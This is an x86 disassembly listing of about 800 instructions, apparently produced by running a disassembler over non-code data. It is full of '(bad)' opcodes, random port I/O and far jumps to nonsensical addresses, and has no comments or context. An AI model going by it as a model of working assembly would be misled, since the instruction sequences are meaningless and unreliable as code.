  41c4dd:	add    dh,dh
  41c4df:	add    bl,al
  41c4e1:	clc    
  41c4e2:	sar    ah,0xc0
  41c4e5:	jecxz  0x41c4cb
  41c4e7:	inc    bl
  41c4e9:	jmp    0x41c4ec
  41c4eb:	(bad)  
  41c4ec:	enter  0xe5a9,0xe0
  41c4f0:	lods   al,BYTE PTR ds:[esi]
  41c4f1:	ret    0xf6fb
  41c4f4:	shl    BYTE PTR [ecx-0x35042b07],0xd9
  41c4fb:	loop   0x41c4bf
  41c4fd:	fucomp st(5)
  41c4ff:	fprem1 
  41c501:	mov    ebp,0x1f4fdd0
  41c506:	add    eax,0xfe01fcc6
  41c50b:	out    0xbe,eax
  41c50d:	loop   0x41c4cb
  41c50f:	in     al,dx
  41c510:	stos   DWORD PTR es:[edi],eax
  41c511:	in     eax,dx
  41c512:	loop   0x41c4ea
  41c514:	(bad)  
  41c515:	iret   
  41c516:	mov    ch,0xf7
  41c518:	not    ebx
  41c51a:	jecxz  0x41c50f
  41c51c:	mov    edi,0x7fae1e8
  41c521:	sar    cl,0xdd
  41c524:	add    al,0xdb
  41c526:	loope  0x41c50d
  41c528:	cld    
  41c529:	fmul   st(0),st
  41c52b:	jmp    0x41c512
  41c52d:	mov    dl,0xe0
  41c52f:	out    dx,al
  41c530:	fst    st(5)
  41c532:	in     al,dx
  41c533:	leave  
  41c534:	scas   eax,DWORD PTR es:[edi]
  41c535:	into   
  41c536:	rcl    edx,1
  41c538:	int3   
  41c539:	clc    
  41c53a:	aad    0xfe
  41c53c:	mov    ecx,0xd4d2e6b6
  41c541:	(bad)  
  41c542:	aad    0xf7
  41c544:	cld    
  41c545:	fild   DWORD PTR [esi]
  41c547:	add    al,dh
  41c549:	jmp    0x41c53d
  41c54b:	enter  0xc0bf,0xe8
  41c54f:	loope  0x41c535
  41c551:	mov    cl,0xc1
  41c553:	iret   
  41c554:	int3   
  41c555:	retf   
  41c556:	imul   dl
  41c558:	retf   
  41c559:	sti    
  41c55a:	fdivp  st(0),st
  41c55c:	out    dx,eax
  41c55d:	jecxz  0x41c53a
  41c55f:	loope  0x41c552
  41c561:	ret    
  41c562:	add    edi,esi
  41c564:	out    0xe2,al
  41c566:	or     al,ch
  41c568:	add    al,BYTE PTR [edi]
  41c56a:	into   
  41c56b:	or     ch,BYTE PTR [ebx-0x3e163d53]
  41c571:	aam    0xe0
  41c573:	cmc    
  41c574:	repnz in al,0xdb
  41c577:	out    dx,eax
  41c578:	in     eax,dx
  41c579:	hlt    
  41c57a:	leave  
  41c57b:	add    edx,edi
  41c57d:	clc    
  41c57e:	int3   
  41c57f:	out    dx,al
  41c580:	add    ch,dh
  41c582:	(bad)  
  41c584:	jecxz  0x41c56b
  41c586:	pop    es
  41c587:	cli    
  41c588:	add    ecx,eax
  41c58a:	push   es
  41c58b:	(bad)  
  41c58d:	lods   al,BYTE PTR ds:[esi]
  41c58e:	repnz scas al,BYTE PTR es:[edi]
  41c590:	lock (bad) 
  41c592:	out    0xcd,al
  41c594:	mov    ch,0xb7
  41c596:	mov    ch,0xbb
  41c598:	cld    
  41c599:	fldlg2 
  41c59b:	hlt    
  41c59c:	stc    
  41c59d:	out    dx,al
  41c59e:	pop    es
  41c59f:	in     al,dx
  41c5a0:	int    0x1
  41c5a2:	push   es
  41c5a3:	clc    
  41c5a4:	or     esi,esp
  41c5a6:	dec    eax
  41c5a8:	cli    
  41c5a9:	retf   0x7e0
  41c5ac:	retf   0xe4ae
  41c5af:	mul    esi
  41c5b1:	ret    0xe7d0
  41c5b4:	mov    dh,0xf3
  41c5b6:	out    0xb8,al
  41c5b8:	shl    ch,cl
  41c5ba:	out    dx,eax
  41c5bb:	iret   
  41c5bc:	loop   0x41c590
  41c5be:	fucom  st(1)
  41c5c0:	sar    BYTE PTR [ebp-0x18f60efb],cl
  41c5c6:	(bad)  
  41c5c7:	(bad)  
  41c5c8:	call   0xee45b8b6
  41c5cd:	retf   
  41c5ce:	lock in eax,0xc3
  41c5d1:	(bad)  
  41c5d2:	(bad)  
  41c5d3:	mov    ch,0xf6
  41c5d5:	scas   al,BYTE PTR es:[edi]
  41c5d6:	fxch   st(1)
  41c5d8:	rcr    eax,cl
  41c5da:	ret    
  41c5db:	aad    0xfc
  41c5dd:	loopne 0x41c5c5
  41c5df:	add    ebp,edx
  41c5e1:	add    edi,edx
  41c5e3:	inc    esp
  41c5e5:	ret    0xf60e
  41c5e8:	stc    
  41c5e9:	les    eax,FWORD PTR [edx]
  41c5eb:	or     al,0xae
  41c5ed:	mov    eax,0xaeb3e9cc
  41c5f2:	jmp    0x41c5dc
  41c5f4:	fcomp  st(0)
  41c5f6:	into   
  41c5f7:	out    dx,al
  41c5f8:	jmp    0xfcd8:0xffb0d2bb
  41c5ff:	(bad)  
  41c601:	mov    esi,0xc5c9c2fd
  41c606:	fxch   st(7)
  41c608:	out    dx,eax
  41c609:	ret    0x9
  41c60c:	(bad)
  41c610:	loop   0x41c5e7
  41c612:	mov    dl,0xd4
  41c615:	into   
  41c616:	call   0xf736b6eb
  41c61b:	enter  0xd4c2,0xdd
  41c61f:	mov    esi,0xf9c5ccdb
  41c624:	jmp    0x41c607
  41c626:	sti    
  41c627:	std    
  41c628:	in     eax,0xdb
  41c62a:	fdivrp st(1),st
  41c62c:	jecxz  0x41c5f8
  41c62e:	fucomp st(4)
  41c630:	in     al,dx
  41c631:	lods   al,BYTE PTR ds:[esi]
  41c632:	lock int 0xd5
  41c635:	(bad)  
  41c636:	jmp    0xe2e8:0xd1bfbfdd
  41c63d:	sti    
  41c63e:	mov    ecx,0xd8daf0f7
  41c643:	hlt    
  41c644:	ror    BYTE PTR [edx],1
  41c646:	jmp    0xe123c849
  41c64b:	clc    
  41c64c:	(bad)  
  41c64e:	jmp    0x41c61e
  41c650:	shr    eax,0xc1
  41c653:	retf   
  41c654:	int    0xd8
  41c656:	(bad)  
  41c657:	fcmovnbe st,st(6)
  41c659:	mov    ecx,0xd4c9feea
  41c65e:	out    dx,al
  41c65f:	mov    ebp,0xe003e3e7
  41c664:	pop    es
  41c665:	add    eax,0xfc0ecefd
  41c66a:	fisttp DWORD PTR [esi]
  41c66c:	retf   
  41c66d:	enter  0xdce0,0xeb
  41c671:	mov    bl,0xcf
  41c673:	loop   0x41c644
  41c675:	cli    
  41c676:	neg    ch
  41c678:	jmp    0xd1bd:0xe2ddd8ba
  41c67f:	(bad)  
  41c680:	repnz shl bl,cl
  41c683:	(bad)  
  41c684:	fld    st(2)
  41c686:	jmp    0xbd06:0xeada04fe
  41c68d:	int    0xca
  41c68f:	in     al,dx
  41c690:	fsub   st(7),st
  41c692:	(bad)  
  41c693:	retf   
  41c694:	aam    0xf5
  41c696:	fidivr WORD PTR [ecx-0x42172d43]
  41c69c:	mov    ebp,0xfef0d7c8
  41c6a1:	fiadd  WORD PTR [edx]
  41c6a3:	(bad)
  41c6a6:	in     al,0xfe
  41c6a8:	fstp   st(4)
  41c6aa:	or     eax,0xf0aae0c9
  41c6af:	out    dx,eax
  41c6b0:	idiv   bl
  41c6b2:	sar    cl,1
  41c6b4:	in     eax,dx
  41c6b5:	int    0xd9
  41c6b7:	sti    
  41c6b8:	shl    ecx,1
  41c6ba:	mov    ch,0xf3
  41c6bc:	mov    esi,0xc606d2c3
  41c6c1:	loop   0x41c6b8
  41c6c3:	(bad)
  41c6c6:	retf   0x5ef
  41c6c9:	hlt    
  41c6ca:	clc    
  41c6cb:	out    dx,eax
  41c6cc:	shr    DWORD PTR [eax-0x53170939],0xc9
  41c6d3:	in     eax,dx
  41c6d4:	rcl    esp,1
  41c6d6:	(bad)  
  41c6d8:	shr    ch,cl
  41c6da:	in     al,dx
  41c6db:	leave  
  41c6dc:	mov    bh,0xd4
  41c6de:	out    dx,eax
  41c6df:	add    esi,edi
  41c6e1:	ret    
  41c6e2:	cli    
  41c6e3:	add    edi,ebx
  41c6e5:	retf   0xcae0
  41c6e8:	jmp    0xf14ca2b2
  41c6ed:	in     al,dx
  41c6ee:	out    dx,eax
  41c6ef:	call   0xa8f79ab5
  41c6f4:	rol    al,0xb8
  41c6f7:	cli    
  41c6f8:	mov    edi,0xfdb4fbc4
  41c6fd:	fadd   DWORD PTR [edx]
  41c6ff:	mov    eax,0xc7f4c7e3
  41c704:	clc    
  41c705:	shl    ah,1
  41c707:	fcomip st,st(4)
  41c709:	call   0xe126b118
  41c70e:	(bad)  
  41c70f:	fdivr  st(0),st
  41c711:	mov    al,0xf6
  41c713:	jmp    0x41c706
  41c715:	leave  
  41c716:	mov    al,0xed
  41c718:	fsubp  st(7),st
  41c71a:	mov    ah,0xfa
  41c71c:	(bad)  
  41c71e:	iret   
  41c71f:	push   es
  41c720:	add    dh,al
  41c722:	aad    0xea
  41c724:	stc    
  41c725:	(bad)  
  41c727:	fisttp WORD PTR [edx]
  41c729:	iret   
  41c72a:	or     dh,cl
  41c72c:	mov    edi,0xcdd3d2c4
  41c731:	mov    esp,0xd5b1b0d2
  41c736:	icebp  
  41c737:	(bad)  
  41c738:	rcl    ecx,1
  41c73a:	repnz fstp TBYTE PTR [esi-0x411fd23]
  41c741:	rol    DWORD PTR [ebx+ecx*1],cl
  41c744:	(bad)  
  41c745:	out    dx,eax
  41c746:	add    al,BYTE PTR [ebx]
  41c748:	jecxz  0x41c713
  41c74a:	out    dx,eax
  41c74b:	add    edx,edx
  41c74d:	scas   al,BYTE PTR es:[edi]
  41c74e:	lock repz shl esp,0xcf
  41c753:	icebp  
  41c754:	out    0xe6,eax
  41c756:	stc    
  41c757:	cmc    
  41c758:	enter  0xffcf,0xd1
  41c75c:	(bad)  
  41c75d:	fdivr  st(5),st
  41c75f:	loope  0x41c739
  41c761:	in     eax,0x6
  41c763:	add    dl,ch
  41c765:	loopne 0x41c767
  41c767:	ror    ch,0xe3
  41c76a:	in     al,0xe4
  41c76c:	ret    
  41c76d:	jmp    0xce379763
  41c772:	mov    cl,0xb4
  41c774:	jmp    0xfb399651
  41c779:	jmp    0x41c751
  41c77b:	retf   0xfabe
  41c77e:	ret    0xbbfd
  41c781:	ror    ebx,cl
  41c783:	test   BYTE PTR [esi+edi*8],0xda
  41c787:	mov    esp,0xe6db03fa
  41c78c:	fdiv   DWORD PTR [eax-0x1e2d1720]
  41c792:	(bad)  
  41c793:	test   ah,0xc8
  41c796:	sar    esi,1
  41c798:	out    dx,eax
  41c799:	out    dx,al
  41c79a:	mov    ecx,0xedc3bed2
  41c79f:	loop   0x41c785
  41c7a1:	mov    esi,0xd0dec102
  41c7a6:	push   cs
  41c7a7:	or     cl,ch
  41c7a9:	loope  0x41c778
  41c7ab:	psubsw mm5,mm3
  41c7ae:	in     al,0xc5
  41c7b0:	iret   
  41c7b1:	in     al,dx
  41c7b2:	xlat   BYTE PTR ds:[ebx]
  41c7b3:	(bad)
  41c7b7:	in     eax,dx
  41c7b8:	mov    ah,0xda
  41c7ba:	hlt    
  41c7bb:	idiv   DWORD PTR [ebx-0x262afc33]
  41c7c1:	shl    bh,0xeb
  41c7c4:	(bad)  
  41c7c6:	in     al,0xe5
  41c7c8:	jmp    0x41c796
  41c7ca:	dec    edx
  41c7cc:	sar    BYTE PTR [eax-0x312a520f],1
  41c7d2:	out    dx,eax
  41c7d3:	hlt    
  41c7d4:	mov    dh,0xd8
  41c7d6:	repnz xlat BYTE PTR ds:[ebx]
  41c7d8:	xlat   BYTE PTR ds:[ebx]
  41c7d9:	test   ebp,0xd7fdfad5
  41c7df:	fdivr  QWORD PTR [ebp+esi*8-0x3e000501]
  41c7e6:	add    ebp,ecx
  41c7e8:	jmp    0x41c7e6
  41c7ea:	jmp    0xd42f89d0
  41c7ef:	in     eax,dx
  41c7f0:	(bad)  
  41c7f2:	lods   eax,DWORD PTR ds:[esi]
  41c7f3:	out    dx,eax
  41c7f4:	repnz repnz out 0xd4,al
  41c7f8:	out    dx,al
  41c7f9:	xlat   BYTE PTR ds:[ebx]
  41c7fa:	retf   
  41c7fb:	std    
  41c7fc:	add    bh,al
  41c7fe:	fadd   DWORD PTR ds:0xfed0feff
  41c804:	fstp   st(5)
  41c806:	iret   
  41c807:	fucomi st,st(7)
  41c809:	in     eax,0x2
  41c80b:	cld    
  41c80c:	lods   eax,DWORD PTR ds:[esi]
  41c80d:	mov    bl,0xdc
  41c80f:	out    dx,eax
  41c810:	int    0xbc
  41c812:	fcmovbe st,st(7)
  41c814:	mov    bl,0xb9
  41c816:	mov    bh,0xb0
  41c818:	in     eax,dx
  41c819:	retf   0xd4f3
  41c81c:	mov    bh,0xf8
  41c81e:	sti    
  41c81f:	into   
  41c820:	rol    DWORD PTR [eax],cl
  41c822:	or     edx,esi
  41c824:	faddp  st(7),st
  41c826:	in     eax,0xf6
  41c828:	push   es
  41c829:	(bad)
  41c82c:	mov    ch,0xac
  41c82f:	in     al,0xd3
  41c831:	repnz retf 0xb5ca
  41c835:	mov    ch,0xbb
  41c838:	cmc    
  41c839:	mov    ebp,0xbebbc8d3
  41c83e:	repnz lock icebp 
  41c841:	ffree  st(6)
  41c843:	in     eax,0xc7
  41c845:	retf   
  41c846:	test   DWORD PTR [edx],0xcf2ccc4
  41c84c:	mov    bl,0xbd
  41c84e:	fnsave [edi-0x25383a4d]
  41c854:	repnz fmul st,st(4)
  41c857:	mov    ah,0xb9
  41c859:	mov    dl,0xcd
  41c85b:	add    bh,bh
  41c85d:	mov    esi,0xfaedbdbe
  41c862:	ret    
  41c863:	fcos   
  41c865:	jmp    0x41c824
  41c867:	into   
  41c868:	fild   DWORD PTR [ebx]
  41c86a:	add    edi,edx
  41c86c:	scas   eax,DWORD PTR es:[edi]
  41c86d:	stos   BYTE PTR es:[edi],al
  41c86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c86f:	xlat   BYTE PTR ds:[ebx]
  41c870:	out    dx,eax
  41c871:	lds    esi,FWORD PTR [esi-0x3a00064f]
  41c877:	fdivrp st(1),st
  41c879:	mov    edx,0x1c8f8bb
  41c87e:	int    0xe6
  41c880:	add    bl,al
  41c882:	jecxz  0x41c88b
  41c884:	mov    edi,0xdbdc07ff
  41c889:	or     ecx,ebp
  41c88b:	push   es
  41c88c:	(bad)  
  41c88e:	scas   al,BYTE PTR es:[edi]
  41c88f:	repz mov dl,0xaa
  41c892:	imul   esi
  41c894:	mov    cl,0xca
  41c896:	(bad)  
  41c898:	fxch   st(5)
  41c89a:	(bad)  
  41c89b:	rcr    eax,1
  41c89d:	mov    eax,0xd0d7d3c1
  41c8a2:	cli    
  41c8a3:	loop   0x41c8a3
  41c8a5:	in     eax,0xef
  41c8a7:	cli    
  41c8a8:	out    dx,eax
  41c8a9:	retf   0xeec8
  41c8ac:	(bad)  
  41c8ad:	iret   
  41c8ae:	in     eax,0xc3
  41c8b0:	mov    dl,0xe5
  41c8b2:	mov    ebx,0xf0bab6ed
  41c8b7:	xlat   BYTE PTR ds:[ebx]
  41c8b8:	int    0xc8
  41c8ba:	cld    
  41c8bb:	leave  
  41c8bc:	ret    
  41c8bd:	(bad)  
  41c8bf:	cli    
  41c8c0:	ret    0xbdf4
  41c8c3:	add    eax,0xefd6d6e8
  41c8c8:	fprem  
  41c8ca:	(bad)  
  41c8cb:	adc    ch,BYTE PTR [ebp-0x160a1920]
  41c8d1:	aam    0xf2
  41c8d3:	mov    ch,0xeb
  41c8d5:	mov    ecx,0xfebefece
  41c8da:	shl    al,cl
  41c8dc:	jmp    0xf8418cd9
  41c8e1:	add    al,0xd9
  41c8e3:	fild   DWORD PTR [ebx]
  41c8e5:	jmp    0x408c4d5
  41c8ea:	adc    al,al
  41c8ec:	test   al,0xe5
  41c8ee:	int    0xd1
  41c8f0:	iret   
  41c8f1:	xlat   BYTE PTR ds:[ebx]
  41c8f2:	shl    ah,cl
  41c8f4:	clc    
  41c8f5:	into   
  41c8f6:	jmp    0x41c8ef
  41c8f8:	(bad)  
  41c8f9:	repz retf 0xfada
  41c8fd:	fdivp  st(6),st
  41c8ff:	add    eax,0xc3ffffc5
  41c904:	mov    edi,0xe7cbeae8
  41c909:	hlt    
  41c90a:	cld    
  41c90b:	push   cs
  41c90c:	ret    0xc7e6
  41c90f:	out    0xb7,al
  41c911:	shl    edi,1
  41c913:	retf   
  41c914:	neg    bl
  41c916:	enter  0xd6d7,0xdd
  41c91a:	iret   
  41c91b:	ret    0xc8f4
  41c91e:	xlat   BYTE PTR ds:[ebx]
  41c91f:	(bad)  
  41c920:	fstp   st(1)
  41c922:	(bad)
  41c925:	(bad)  
  41c926:	or     eax,eax
  41c928:	out    dx,eax
  41c929:	retf   
  41c92a:	int3   
  41c92b:	adc    bl,ch
  41c92d:	loopne 0x41c906
  41c92f:	test   bh,0xca
  41c932:	ror    ebp,cl
  41c934:	mov    ch,0xb9
  41c936:	int    0xfe
  41c938:	clc    
  41c939:	(bad)  
  41c93b:	lock add ah,bh
  41c93e:	cmc    
  41c93f:	loopne 0x41c907
  41c941:	clc    
  41c942:	(bad)  
  41c943:	repnz (bad) 
  41c945:	in     al,0x6
  41c947:	or     al,BYTE PTR [eax]
  41c949:	lds    eax,FWORD PTR [esi]
  41c94b:	adc    eax,esi
  41c94d:	fsubr  st(4),st
  41c94f:	mov    bh,0xf6
  41c951:	in     eax,dx
  41c952:	mov    al,0xb2
  41c954:	fmul   st,st(4)
  41c956:	test   bh,0xb3
  41c959:	in     al,dx
  41c95a:	repz add ah,bl
  41c95d:	fcmove st,st(5)
  41c95f:	mov    esi,0xe0f8bae1
  41c964:	rol    al,1
  41c966:	pop    es
  41c967:	std    
  41c968:	std    
  41c969:	les    eax,FWORD PTR [esi+ebp*8]
  41c96c:	mov    ecx,0xd7e6c0a9
  41c971:	ret    0xf9b1
  41c974:	mov    cl,0xd7
  41c976:	shr    ah,1
  41c978:	mov    eax,0xd6dfdbdc
  41c97d:	fdivr  st(7),st
  41c97f:	(bad)  
  41c980:	cld    
  41c981:	loope  0x41c967
  41c983:	ret    0xfd9
  41c986:	sar    dl,0xfc
  41c989:	cld    
  41c98a:	retf   0xacc8
  41c98d:	int    0xee
  41c98f:	in     eax,0xe7
  41c991:	rcr    edx,0xc2
  41c994:	jmp    0x41c964
  41c996:	jmp    0xd641ae65
  41c99b:	jecxz  0x41c97c
  41c99d:	std    
  41c99e:	loope  0x41c96e
  41c9a0:	push   es
  41c9a1:	(bad)
  41c9a4:	ret    0xf6d9
  41c9a7:	sti    
  41c9a8:	or     al,0xf8
  41c9aa:	iret   
  41c9ab:	add    dl,dl
  41c9ad:	test   al,0xe4
  41c9af:	in     al,0xec
  41c9b1:	aad    0xd4
  41c9b3:	into   
  41c9b4:	into   
  41c9b5:	clc    
  41c9b6:	in     eax,0xf6
  41c9b8:	clc    
  41c9b9:	imul   bl
  41c9bb:	ret    0xccd6
  41c9be:	mov    DWORD PTR [ecx],0xdf02dfe4
  41c9c4:	or     bl,al
  41c9c6:	(bad)  
  41c9c7:	hlt    
  41c9c8:	or     eax,0xafdd0ecf
  41c9cd:	enter  0xcbe6,0xcc
  41c9d1:	mov    bh,0xed
  41c9d3:	in     eax,0xef
  41c9d5:	mov    ch,0xf3
  41c9d7:	shl    esp,1
  41c9d9:	cli    
  41c9da:	fdivr  st,st(6)
  41c9dc:	rcl    ebx,cl
  41c9de:	loope  0x41c9ae
  41c9e0:	in     eax,0xe2
  41c9e2:	(bad)  
  41c9e4:	stc    
  41c9e5:	or     eax,esp
  41c9e7:	mov    esp,0xcaec0ffd
  41c9ec:	lds    ebp,FWORD PTR [edi-0x1b4c4e0e]
  41c9f2:	mov    dl,0xf5
  41c9f4:	fprem  
  41c9f6:	mov    ebx,0xf8eeb7cd
  41c9fb:	mov    ebp,0xc2b8b9c3
  41ca00:	loop   0x41ca01
  41ca02:	or     ah,bl
  41ca04:	(bad)  
  41ca05:	(bad)
  41ca08:	loop   0x41ca04
  41ca0a:	ror    DWORD PTR [esi],cl
  41ca0c:	jmp    0xb5cd:0xade4eaef
  41ca13:	out    dx,al
  41ca14:	cmc    
  41ca15:	aam    0xf2
  41ca17:	dec    ch
  41ca19:	enter  0xdad8,0xbb
  41ca1d:	rcl    ebx,0xfb
  41ca20:	out    0x2,eax
  41ca22:	sti    
  41ca23:	add    ecx,esi
  41ca25:	(bad)  
  41ca27:	mov    esp,0xf202cdf4
  41ca2c:	mov    esp,0xd4f6f7d3
  41ca31:	aad    0xd2
  41ca33:	mov    dl,0xd5
  41ca35:	ror    dh,1
  41ca37:	into   
  41ca38:	(bad)  
  41ca39:	(bad)  
  41ca3b:	jmp    0xdcd9:0xbdd201bf
  41ca42:	(bad)  
  41ca43:	fiadd  DWORD PTR [eax]
  41ca45:	or     eax,DWORD PTR [eax]
  41ca47:	cmc    
  41ca48:	leave  
  41ca49:	in     al,0xcb
  41ca4b:	iret   
  41ca4c:	out    dx,eax
  41ca4d:	(bad)  
  41ca4f:	(bad)
  41ca52:	sar    edx,cl
  41ca54:	div    BYTE PTR [ebp-0x20160439]
  41ca5a:	cmc    
  41ca5b:	repnz idiv edx
  41ca5e:	out    dx,eax
  41ca5f:	in     eax,0xf1
  41ca61:	add    al,bl
  41ca63:	add    dl,ch
  41ca65:	(bad)  
  41ca67:	(bad)  
  41ca68:	fucomi st,st(1)
  41ca6a:	clc    
  41ca6b:	out    0xcc,al
  41ca6d:	mov    dl,0xe0
  41ca6f:	repnz shl cl,1
  41ca72:	out    dx,eax
  41ca73:	stc    
  41ca74:	mov    ebx,0xefd7f0f6
  41ca79:	iret   
  41ca7a:	fcmovne st,st(2)
  41ca7c:	mov    edi,0xccdfd1f0
  41ca81:	icebp  
  41ca82:	clc    
  41ca83:	lock loop 0x41ca51
  41ca86:	or     esp,ebx
  41ca88:	in     al,dx
  41ca89:	out    dx,al
  41ca8a:	(bad)  
  41ca8b:	fsubrp st(4),st
  41ca8d:	icebp  
  41ca8e:	mov    esi,0xb6d7ade3
  41ca93:	enter  0xd6f8,0xe9
  41ca97:	(bad)  
  41ca98:	sar    ecx,1
  41ca9a:	test   BYTE PTR [edx],0xc1
  41ca9d:	(bad)  
  41ca9e:	test   DWORD PTR [eax],0xc5d8f6fc
  41caa4:	cld    
  41caa5:	call   0xf44dad71
  41caaa:	cld    
  41caab:	or     al,0xcf
  41caad:	ret    0xc4cd
  41cab0:	loopne 0x41ca9b
  41cab2:	aam    0xfa
  41cab4:	aad    0xeb
  41cab6:	repz out dx,al
  41cab8:	jmp    0x41ca98
  41caba:	repz fadd DWORD PTR [ecx]
  41cabd:	fiadd  WORD PTR [eax]
  41cabf:	add    dh,dh
  41cac1:	loopne 0x41ca9c
  41cac3:	rcr    cl,1
  41cac5:	cmc    
  41cac6:	push   es
  41cac7:	add    al,0xe3
  41cac9:	aam    0xe9
  41cacb:	in     al,dx
  41cacc:	loopne 0x41cab9
  41cace:	repz mov dl,0xf2
  41cad1:	out    0xb2,al
  41cad3:	ret    0xaee6
  41cad6:	aad    0xc9
  41cad8:	cli    
  41cad9:	aad    0xb4
  41cadb:	in     al,dx
  41cadc:	fcom   st(2)
  41cade:	inc    BYTE PTR [eax]
  41cae0:	fld    DWORD PTR [edx]
  41cae2:	fadd   st,st(2)
  41cae4:	ffreep st(6)
  41cae6:	(bad)  
  41cae8:	out    0xe9,al
  41caea:	(bad)  
  41caec:	jecxz  0x41caad
  41caee:	in     eax,0xcd
  41caf0:	lods   eax,DWORD PTR ds:[esi]
  41caf1:	(bad)  
  41caf2:	repz fcmove st,st(4)
  41caf5:	shl    DWORD PTR [ecx+ecx*8-0x162f2e2e],1
  41cafc:	call   0xed19d1b9
  41cb01:	mov    esi,0xf4f8fcfb
  41cb06:	shl    esi,0x4
  41cb09:	or     ah,bh
  41cb0b:	pop    es
  41cb0c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb0e:	loope  0x41caee
  41cb10:	in     al,0xaa
  41cb12:	aam    0xc2
  41cb14:	loope  0x41cac6
  41cb16:	stc    
  41cb17:	aad    0xba
  41cb19:	mov    eax,0xd7d5f9ee
  41cb1e:	aad    0xd9
  41cb20:	add    DWORD PTR [ebx],eax
  41cb22:	jmp    0xdafd:0xdaffffda
  41cb29:	fild   DWORD PTR [ebx]
  41cb2b:	dec    al
  41cb2d:	int3   
  41cb2e:	int    0xc2
  41cb30:	sar    BYTE PTR [eax+esi*8-0x17142f3f],cl
  41cb37:	(bad)  
  41cb39:	aad    0xde
  41cb3b:	fnstcw WORD PTR [esi-0xd0b050c]
  41cb41:	loop   0x41cb40
  41cb43:	add    eax,0xebdec0f5
  41cb48:	into   
  41cb49:	(bad)  
  41cb4a:	(bad)  
  41cb4b:	(bad)  
  41cb4c:	repnz shl BYTE PTR [ebp-0x2c3d3b44],0xba
  41cb54:	ror    esp,cl
  41cb56:	jmp    0xe941a547
  41cb5b:	retf   0xfbbe
  41cb5e:	add    bh,BYTE PTR [ebp-0x2406270b]
  41cb64:	or     cl,bh
  41cb66:	push   cs
  41cb67:	(bad)  
  41cb69:	into   
  41cb6a:	int    0xed
  41cb6c:	enter  0xb1ea,0xf0
  41cb70:	aam    0xb6
  41cb72:	lods   al,BYTE PTR ds:[esi]
  41cb73:	(bad)  
  41cb74:	aad    0xdb
  41cb76:	(bad)  
  41cb77:	lods   al,BYTE PTR ds:[esi]
  41cb78:	in     al,dx
  41cb79:	iret   
  41cb7a:	mov    edx,0xf7ddbdbf
  41cb7f:	pop    es
  41cb80:	push   edi
  41cb82:	(bad)  
  41cb84:	pop    es
  41cb85:	or     ecx,DWORD PTR [ecx]
  41cb87:	aam    0xdc
  41cb89:	into   
  41cb8a:	cli    
  41cb8b:	adc    ecx,eax
  41cb8d:	repnz lods eax,DWORD PTR ds:[esi]
  41cb8f:	mov    dl,0xac
  41cb91:	into   
  41cb92:	into   
  41cb93:	fldpi  
  41cb95:	mov    bh,0xe8
  41cb97:	leave  
  41cb98:	iret   
  41cb99:	jecxz  0x41cb4f
  41cb9b:	mov    eax,0x2befffb
  41cba0:	add    esi,ebx
  41cba2:	or     cl,BYTE PTR [edx]
  41cba4:	(bad)  
  41cba5:	leave  
  41cba6:	fcmove st,st(6)
  41cba8:	push   cs
  41cba9:	add    cl,BYTE PTR [edx]
  41cbab:	fldcw  WORD PTR [ebx-0x3b37501b]
  41cbb1:	int3   
  41cbb2:	out    0xfb,eax
  41cbb4:	(bad)  
  41cbb5:	out    0xb5,eax
  41cbb7:	into   
  41cbb8:	rol    ah,1
  41cbba:	in     eax,dx
  41cbbb:	loop   0x41cb76
  41cbbd:	rol    DWORD PTR [esi],cl
  41cbbf:	in     al,dx
  41cbc0:	fstp   st(0)
  41cbc2:	in     al,0x0
  41cbc4:	aad    0xd4
  41cbc6:	loop   0x41cbbd
  41cbc8:	std    
  41cbc9:	cli    
  41cbca:	shr    ebx,0xf0
  41cbcd:	shl    esp,1
  41cbcf:	jmp    0xc7b2:0xedd0d0e2
  41cbd6:	idiv   BYTE PTR [edx+0x2f3c9fe]
  41cbdc:	fstp   st(6)
  41cbde:	(bad)  
  41cbdf:	cli    
  41cbe0:	aad    0x4
  41cbe2:	ffree  st(2)
  41cbe4:	fcmovnu st,st(6)
  41cbe6:	or     esp,esi
  41cbe8:	add    ah,bl
  41cbea:	out    dx,al
  41cbeb:	add    al,0xdc
  41cbed:	jmp    0xd0309ea4
  41cbf2:	(bad)
  41cbf5:	cli    
  41cbf6:	mov    edx,0xf6d7bbfd
  41cbfb:	aam    0xba
  41cbfd:	repnz (bad) 
  41cc00:	pop    es
  41cc01:	add    dl,bl
  41cc03:	(bad)  
  41cc05:	jecxz  0x41cc09
  41cc07:	jmp    0xc4c2:0xcbdbdacf
  41cc0e:	shr    dl,1
  41cc10:	scas   al,BYTE PTR es:[edi]
  41cc11:	int3   
  41cc12:	fcmovu st,st(2)
  41cc14:	rol    esi,0xc4
  41cc17:	int3   
  41cc18:	mov    edx,0xe0efddd4
  41cc1d:	rol    ebx,0xbd
  41cc20:	sti    
  41cc21:	(bad)  
  41cc22:	retf   
  41cc23:	mov    ebp,0xc9c7e1e4
  41cc29:	in     al,0xd3
  41cc2b:	in     al,0xdf
  41cc2d:	out    dx,eax
  41cc2e:	in     al,dx
  41cc2f:	test   al,0xb0
  41cc31:	mov    esp,0xe9b1c8e1
  41cc36:	lock mov ah,0xea
  41cc39:	out    dx,eax
  41cc3a:	jmp    0xd713a01c
  41cc3f:	sar    eax,cl
  41cc41:	in     al,dx
  41cc42:	add    ch,bl
  41cc44:	(bad)  
  41cc45:	call   0xee0ba73e
  41cc4a:	add    eax,0xe8bee502
  41cc4f:	(bad)
  41cc52:	shr    dh,1
  41cc54:	hlt    
  41cc55:	repnz (bad) 
  41cc57:	out    0xf1,al
  41cc59:	int    0xe2
  41cc5b:	retf   0xeffc
  41cc5e:	fstp   st(3)
  41cc60:	test   esi,0xc8f8bcf9
  41cc66:	iret   
  41cc67:	push   cs
  41cc68:	jmp    0xcac9:0xe0caeff4
  41cc6f:	mov    dh,0xcf
  41cc71:	in     al,dx
  41cc72:	loope  0x41cc3d
  41cc74:	mov    ch,0xe0
  41cc76:	in     al,dx
  41cc77:	dec    bl
  41cc79:	call   0xdf1b8658
  41cc7e:	shr    ch,1
  41cc80:	pop    es
  41cc81:	out    0xd6,eax
  41cc83:	jmp    0x41cc8c
  41cc85:	or     eax,edi
  41cc87:	(bad)
  41cc8a:	(bad)
  41cc8d:	(bad)  
  41cc8e:	repz call 0xb8108f45
  41cc94:	in     eax,0xea
  41cc96:	repnz in eax,dx
  41cc98:	in     eax,0xeb
  41cc9a:	xlat   BYTE PTR ds:[ebx]
  41cc9b:	jecxz  0x41cc7b
  41cc9d:	out    dx,eax
  41cc9e:	ret    
  41cc9f:	int    0xbd
  41cca1:	mov    edx,0xd603fce7
